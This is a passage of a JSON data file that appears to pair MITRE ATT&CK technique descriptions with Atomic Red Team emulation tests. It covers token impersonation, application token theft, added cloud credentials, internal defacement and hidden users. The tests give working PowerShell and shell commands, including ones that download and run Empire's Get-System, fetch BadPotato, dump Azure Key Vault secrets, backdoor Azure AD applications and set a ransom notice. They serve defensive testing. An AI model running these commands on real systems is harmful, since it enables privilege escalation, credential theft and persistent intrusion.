process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.", "atomic_tests": [{"name": "Named pipe client impersonation", "auto_generated_guid": "90db9e27-8e7c-4c04-b602-a45927884966", "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n", "name": "powershell", "elevation_required": true}}, {"name": "`SeDebugPrivilege` token duplication", "auto_generated_guid": "34f0a430-9d04-4d98-bcb5-1989f14719f0", "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n", "name": "powershell", "elevation_required": true}}, {"name": "Launch NSudo Executable", "auto_generated_guid": "7be1bc0f-d8e5-4345-9333-f5f67d742cb9", "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.", "supported_platforms": ["windows"], "input_arguments": {"nsudo_path": {"description": "Path to the NSudo bat file", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "NSudo.bat must exist in the specified path #{nsudo_path}\n", "prereq_command": "if (Test-Path \"#{nsudo_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Force\nRename-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo Launcher\\x64\\NSudoLG.exe\" \"#{nsudo_path}\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -Recurse -ErrorAction Ignore\n"}], "executor": {"command": "Start-Process \"#{nsudo_path}\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n", "name": "powershell"}}, {"name": "Bad Potato", "auto_generated_guid": "9c6d799b-c111-4749-a42f-ec2f8cb51448", "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "BadPotato.exe must exist in the temp directory\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n"}], "executor": {"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n", "cleanup_command": "taskkill /f /im notepad.exe\n", "name": "powershell", "elevation_required": true}}]}, "T1528": {"name": "Steal Application Access Token", "technique_id": "attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a", "external_id": "T1528", "data_components": ["User Account Modification"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nIn Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  \n\n", "atomic_tests": [{"name": "Azure - Dump All Azure Key Vaults with Microburst", "auto_generated_guid": "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea", "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": null}, "password": {"description": "Azure AD password", "type": "string", "default": "T1082Az"}, "output_file": {"description": "File to dump results to", "type": "string", "default": "$env:temp\\T1528Test1.txt"}, "subscription_id": {"description": "Azure subscription id to search", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The Get-AzurePasswords script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n"}, {"description": "The Azure RM module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureRM -Force -allowclobber\n"}, {"description": "The Azure module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Azure -Force -allowclobber\n"}], "executor": {"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' > #{output_file}\ncat #{output_file}\n", "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}]}, "T1098.001": {"name": "Additional Cloud Credentials", "technique_id": "attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd", "external_id": "T1098.001", "data_components": ["User Account Modification"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation Persistence)", "atomic_tests": [{"name": "Azure AD Application Hijacking - Service Principal", "auto_generated_guid": "b8e747c3-bdf7-4d71-bce2-f1df2a057406", "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "service_principal_name": {"description": "Name of the targeted service principal", "type": "string", "default": "SuperSP"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n", "name": "powershell", "elevation_required": false}}, {"name": "Azure AD Application Hijacking - App Registration", "auto_generated_guid": "a12b5531-acab-4618-a470-0dafb294a87a", "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "application_name": {"description": "Name of the targeted application", "type": "string", "default": "SuperApp"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n", "name": "powershell", "elevation_required": false}}, {"name": "AWS - Create Access Key and Secret Key", "auto_generated_guid": "8822c3b0-d9f9-4daf-a043-491160a31122", "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"username": {"description": "Create new AWS access and secret keys for the user", "type": "string", "default": "atomicredteam"}}, "dependencies": [{"description": "Check if the user exists.\n", "prereq_command": "aws iam list-users | grep #{username}\n", "get_prereq_command": "echo Please run atomic test T1136.003, before running this atomic\n"}], "executor": {"command": "aws iam create-access-key --user-name #{username} > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\ncd \"$PathToAtomicsFolder/T1098.001/bin/\"\n./aws_secret.sh\n", "cleanup_command": "access_key=`cat \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\" | jq -r '.AccessKey.AccessKeyId'`\naws iam delete-access-key --access-key-id $access_key --user-name #{username}\nrm \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\n", "name": "sh"}}]}, "T1491.001": {"name": "Internal Defacement", "technique_id": "attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103", "external_id": "T1491.001", "data_components": ["Network Traffic Content", "Application Log Content", "File Creation", "File Modification"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": ["course-of-action--3efe43d1-6f3f-4fcb-ab39-4a730971f70b"], "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)", "atomic_tests": [{"name": "Replace Desktop Wallpaper", "auto_generated_guid": "30558d53-9d76-41c4-9267-a7bd5184bed3", "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n", "supported_platforms": ["windows"], "input_arguments": {"url_of_wallpaper": {"description": "URL pointing to the image file you wish to set as wallpaper", "type": "url", "default": "https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png"}, "pointer_to_orginal_wallpaper": {"description": "Full path to where a file containing the original wallpaper location will be saved", "type": "string", "default": "$env:TEMP\\T1491.001-OrginalWallpaperLocation"}, "wallpaper_location": {"description": "Full path to where the downloaded wallpaper image will be saved", "type": "string", "default": "$env:TEMP\\T1491.001-newWallpaper.png"}}, "executor": {"command": "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}\n", "cleanup_command": "$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n     add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message", "auto_generated_guid": "ffcbfaab-c9ff-470b-928c-f086b326089b", "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n", "supported_platforms": ["windows"], "input_arguments": {"legal_notice_caption": {"description": "Title of ransom message", "type": "string", "default": "PYSA"}, "legal_notice_text": {"description": "Body of ransom message", "type": "string", "default": "Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org"}}, "executor": {"command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"#{legal_notice_caption}\"\n$newLegalNoticeText = \"#{legal_notice_text}\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ", "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force\n", "name": "powershell", "elevation_required": true}}]}, "T1564.002": {"name": "Hidden Users", "technique_id": "attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d", "external_id": "T1564.002", "data_components": ["Process Creation", "User Account Creation", "Command Execution", "Windows Registry Key Modification", "File Modification", "User Account Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.", "atomic_tests": [{"name": "Create Hidden User using UniqueID < 500", "auto_generated_guid": "4238a7f0-a980-4fff-98a2-dfc0a363d507", "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n", "supported_platforms": ["macos"], "input_arguments": {"user_name": {"description": "username to add", "type": "string", "default": "APT"}}, "executor": {"command": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n", "cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n", "elevation_required": true, "name": "sh"}}, {"name": "Create Hidden User using IsHidden option", "auto_generated_guid": "de87ed7b-52c3-43fd-9554-730f695e7f31", "description": "Add a hidden user on macOS using IsHidden optoin\n", "supported_platforms": ["macos"], "input_arguments": {"user_name": {"description": "username to add", "type": "string", "default": "APT"}}, "executor": {"command": "sudo dscl . -create /Users/#{user_name} IsHidden 1\n", "cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n", "elevation_required": true, "name": "sh"}}, {"name": "Create Hidden User in Registry", "auto_generated_guid": "173126b7-afe4-45eb-8680-fa9f6400431c", 